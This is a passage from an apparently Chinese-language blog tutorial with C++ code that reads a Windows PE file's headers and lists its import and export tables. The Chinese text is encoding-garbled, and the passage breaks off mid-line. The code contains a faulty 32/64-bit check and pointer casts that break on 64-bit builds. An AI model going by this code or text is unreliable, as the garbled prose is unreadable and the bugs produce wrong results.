ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = (PIMAGE_NT_HEADERS)((DWORD)pDosHead + pDosHead-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">return</span> pNtHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Signatur"><a href="#Signatur" class="headerlink" title="Signatur"></a>Signatur</h5><p>è¿™ä¸ªå‚æ•°å’Œ<strong>IMAGE_FILE_HEADER</strong>è¡¨ä¸€èµ·è·å–å³å¯</p><h5 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h5><p>è¿™ä¸ªè¡¨ç¤ºåœ¨NTè¡¨ä¸‹é¢æ‰€ä»¥ç›´æ¥è°ƒç”¨å°±å¥½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFileHeaderInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ç­¾å(Signatur):                                  %x\n&quot;</span>, pNtHead-&gt;Signature);<span class="comment">//è¿™ä¸ªæ˜¯Signaturå€¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¿è¡Œå¹³å°(Machine):                               %x\n&quot;</span>, pNtHead-&gt;FileHeader.Machine);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;èŠ‚åŒºæ•°ç›®(NumberOfSections):                      %x\n&quot;</span>, pNtHead-&gt;FileHeader.NumberOfSections);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºæ—¶é—´(TimeDateStamp):                         %x\n&quot;</span>, pNtHead-&gt;FileHeader.TimeDateStamp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;COFFæ–‡ä»¶ç¬¦å·è¡¨åç§»(PointerToSymbolTable):        %x\n&quot;</span>, pNtHead-&gt;FileHeader.PointerToSymbolTable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ç¬¦å·è¡¨çš„æ•°é‡(NumberOfSymbols):                   %x\n&quot;</span>, pNtHead-&gt;FileHeader.NumberOfSymbols);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¯é€‰å¤´å¤§å°(SizeOfOptionalHeader):                %x\n&quot;</span>, pNtHead-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶ç‰¹æ€§(Characteristics):                       %x\n&quot;</span>, pNtHead-&gt;FileHeader.Characteristics);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºå†…å®¹å®Œå…¨ä¸€è‡´</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/22.png" alt="image-20200705194630967"></p><p>è¾“å‡ºå†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/23.png" alt="image-20200705194438923"></p><h5 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h5><p>ç›´æ¥è´´ä»£ç ï¼Œå› ä¸ºè¯¥è¡¨ä¸­<strong>IMAGE_DATA_DIRECTORY</strong>è¡¨æ²¡å•¥ç”¨è¿™è¾¹å°±å±•ç¤ºä¸å†™äº†ï¼Œåé¢æœ‰æ—¶é—´è¡¥ä¸Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayOptionalHeaderInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é­”æ•°(Magic)ï¼š                                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Magic);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é“¾æ¥å™¨çš„ä¸»ç‰ˆæœ¬å·(MajorLinkerVersion)ï¼š           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorLinkerVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é“¾æ¥å™¨çš„æ¬¡ç‰ˆæœ¬å·(MinorLinkerVersion)ï¼š           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorLinkerVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä»£ç èŠ‚å¤§å°(SizeOfCode)ï¼š                         %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfCode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å·²åˆå§‹åŒ–æ•°å¤§å°(SizeOfInitializedData)ï¼š          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfInitializedData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æœªåˆå§‹åŒ–æ•°å¤§å°(SizeOfUninitializedData)ï¼š        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfUninitializedData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æœ€å…ˆæ‰§è¡Œä»£ç èµ·å§‹åœ°å€(AddressOfEntryPoint)ï¼š      %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä»£ç åŸºå€(BaseOfCode)ï¼š                           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.BaseOfCode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ•°æ®åŸºå€(BaseOfData)ï¼š                           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.BaseOfData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒé¦–åœ°å€(ImageBase)ï¼š                          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;èŠ‚æ®µåœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½(SectionAlignment)ï¼š       %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;èŠ‚æ®µåœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½(FileAlignment)ï¼š      %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.FileAlignment);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¸»ç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·(MajorOperatingSystemVersion)ï¼š  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorOperatingSystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¸»ç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å·(MinorOperatingSystemVersion)ï¼š  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorOperatingSystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒçš„ä¸»ç‰ˆæœ¬å·(MajorImageVersion)ï¼š              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorImageVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒçš„æ¬¡ç‰ˆæœ¬å·(MinorImageVersion)ï¼š              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorImageVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å­ç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·(MajorSubsystemVersion)ï¼š        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorSubsystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å­ç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å·(MinorSubsystemVersion)ï¼š        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorSubsystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¿ç•™å­—æ®µ(Win32VersionValue)ï¼š                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Win32VersionValue);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒè¢«åŠ è½½è¿›å†…å­˜æ—¶çš„å¤§å°(SizeOfImage)ï¼š          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ‰€æœ‰å¤´çš„æ€»å¤§å°(SizeOfHeaders)ï¼š                  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒæ–‡ä»¶çš„æ ¡éªŒå’Œ(CheckSum)ï¼š                     %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.CheckSum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¿è¡Œæ­¤é•œåƒæ‰€éœ€çš„å­ç³»ç»Ÿ(Subsystem)ï¼š              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Subsystem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DLLæ ‡è¯†(DllCharacteristics)ï¼š                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.DllCharacteristics);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æœ€å¤§æ ˆå¤§å°(SizeOfStackReserve)ï¼š                 %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfStackReserve);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹æäº¤çš„å †æ ˆå¤§å°(SizeOfStackCommit)ï¼š          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfStackCommit);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æœ€å¤§å †å¤§å°(SizeOfHeapReserve)ï¼š                  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeapReserve);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹æäº¤çš„å±€éƒ¨å †ç©ºé—´å¤§å°(SizeOfHeapCommit)ï¼š     %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeapCommit);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¿ç•™å­—æ®µ(LoaderFlags)ï¼š                          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.LoaderFlags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DataDirectoryçš„æ•°ç»„ä¸ªæ•°(NumberOfRvaAndSizes)ï¼š   %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.NumberOfRvaAndSizes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸¤è€…çš„å€¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/24.png" alt="image-20200705194853197"></p><p>è¾“å‡ºå†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/25.png" alt="image-20200705194956218"></p><h4 id="è·å–å¯¼å…¥è¡¨"><a href="#è·å–å¯¼å…¥è¡¨" class="headerlink" title="è·å–å¯¼å…¥è¡¨"></a>è·å–å¯¼å…¥è¡¨</h4><p>æœ‰äº›æ–‡ä»¶æ˜¯æ²¡æœ‰åŠæ³•è·å–åˆ°å¯¼å…¥è¡¨çš„ï¼Œä½†æ˜¯åªè¦æ˜¯æ­£å¸¸çš„PEæ–‡ä»¶çš„è¯è¿˜æ˜¯å¯ä»¥è·å–çš„</p><p>ç›´æ¥è´´ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayImportTable</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pInput = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_THUNK_DATA _pThunk = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThunk = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOriginalFirstThunk = <span class="literal">NULL</span>;</span><br><span class="line">    USHORT Hint;</span><br><span class="line">    <span class="keyword">int</span> iSystemBits = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ç‰ˆæœ¬æ˜¯32ä½è¿˜æ˜¯64ä½</span></span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;FileHeader.Machine== IMAGE_FILE_MACHINE_I386)</span><br><span class="line">    &#123;</span><br><span class="line">        iSystemBits = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;FileHeader.Machine == (IMAGE_FILE_MACHINE_IA64 || IMAGE_FILE_MACHINE_AMD64))</span><br><span class="line">    &#123;</span><br><span class="line">        iSystemBits = <span class="number">64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress == <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;  <span class="comment">// è¯»å–å¯¼å…¥è¡¨RVA</span></span><br><span class="line">    pInput = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span> (; pInput-&gt;Name != <span class="literal">NULL</span>;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* szFunctionModule = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)pInput-&gt;Name, <span class="literal">NULL</span>);  <span class="comment">// éå†å‡ºæ¨¡å—åç§°</span></span><br><span class="line">        dwThunk = pInput-&gt;FirstThunk;</span><br><span class="line">        dwOriginalFirstThunk= pInput-&gt;OriginalFirstThunk;</span><br><span class="line">        _pThunk = (PIMAGE_THUNK_DATA)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)pInput-&gt;FirstThunk, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (; _pThunk-&gt;u1.AddressOfData != <span class="literal">NULL</span>;)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">char</span>* szFunction = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)(((PIMAGE_IMPORT_BY_NAME)_pThunk-&gt;u1.AddressOfData)-&gt;Name), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (szFunction != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;Hint, szFunction - <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Hint = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (Hint== <span class="literal">NULL</span> || dwThunk == <span class="literal">NULL</span> || dwOriginalFirstThunk == <span class="literal">NULL</span> || szFunctionModule == <span class="literal">NULL</span> || szFunction == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åºå·ï¼š&quot;</span> &lt;&lt; Hint &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thunk RVAï¼š&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; dwThunk &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;OriginalFirstThunkï¼š&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; dwOriginalFirstThunk &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;DLLåç§°ï¼š&quot;</span> &lt;&lt; szFunctionModule &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;APIåç§°ï¼š&quot;</span> &lt;&lt; szFunction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//32ä½ +4 64ä½+8</span></span><br><span class="line">            <span class="keyword">if</span> (iSystemBits == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwThunk += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (iSystemBits == <span class="number">64</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwThunk += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            _pThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        pInput++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/26.png" alt="image-20200713172823169"></p><h4 id="è·å–å¯¼å‡ºè¡¨"><a href="#è·å–å¯¼å‡ºè¡¨" class="headerlink" title="è·å–å¯¼å‡ºè¡¨"></a>è·å–å¯¼å‡ºè¡¨</h4><p>è¿™ä¸ªè¡¨ä¸€èˆ¬éƒ½åœ¨DLLæ–‡ä»¶ä¸­æ‰€ä»¥ï¼Œè¿™è¾¹æ¢äº†ä¸ªDLLæ–‡ä»¶æ¥è·å–ï¼Œç›´æ¥è´´ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DisplayExportTable</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = (PIMAGE_NT_HEADERS)((DWORD)pDosHead + pDosHead-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;Signature != <span class="number">0x00004550</span>) &#123; <span class="keyword">return</span>; &#125;        <span class="comment">// æ— æ•ˆPEæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">    pExport = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">    DWORD NumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">    ULONGLONG** ppdwNames = (ULONGLONG**)pExport-&gt;AddressOfNames;</span><br><span class="line">    ppdwNames = (PULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">    ULONGLONG** ppdwAddr = (ULONGLONG**)pExport-&gt;AddressOfFunctions;</span><br><span class="line">    ppdwAddr = (PULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (DWORD)ppdwAddr, <span class="literal">NULL</span>);</span><br><span class="line">    ULONGLONG* ppdwOrdin = (ULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (DWORD)pExport-&gt;AddressOfNameOrdinals, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* szFunction = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)*ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;ç‰¹å¾å€¼ï¼š&quot;</span> &lt;&lt; pExport-&gt;Characteristics &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;æ—¶é—´æ—¥æœŸæ ‡å¿—ï¼š&quot;</span> &lt;&lt;<span class="built_in">std</span>::hex&lt;&lt; pExport-&gt;TimeDateStamp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//std::cout  &lt;&lt;&quot;å¤§ç‰ˆæœ¬å·&quot;&lt;&lt; pExport-&gt;MajorVersion &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;å°ç‰ˆæœ¬å·&quot; &lt;&lt; pExport-&gt;MinorVersion &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ç‰ˆæœ¬å·ï¼š&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex&lt;&lt;pExport-&gt;MajorVersion &lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;<span class="built_in">std</span>::hex&lt;&lt;pExport-&gt;MinorVersion &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åç§°ï¼š&quot;</span>&lt;&lt;pExport-&gt;Name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åŸºå€ï¼š&quot;</span>&lt;&lt;pExport-&gt;Base &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>  &lt;&lt;<span class="string">&quot;å‡½æ•°ä¸ªæ•°ï¼š&quot;</span>&lt;&lt; pExport-&gt;NumberOfFunctions &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åç§°ä¸ªæ•°ï¼š&quot;</span>&lt;&lt; pExport-&gt;NumberOfNames &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;å‡½æ•°åœ°å€ï¼š&quot;</span> &lt;&lt; pExport-&gt;AddressOfFunctions &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åç§°åœ°å€ï¼š&quot;</span> &lt;&lt; pExport-&gt;AddressOfNames &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åç§°åºæ•°åœ°å€ï¼š&quot;</span> &lt;&lt; pExport-&gt;AddressOfNameOrdinals &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; NumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;åºå·ï¼š&quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;RVA&quot;</span>&lt;&lt; *ppdwAddr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;åç§°ï¼š&quot;</span>&lt;&lt; szFunction &lt;&lt; <span class="built_in">std</span>::<span 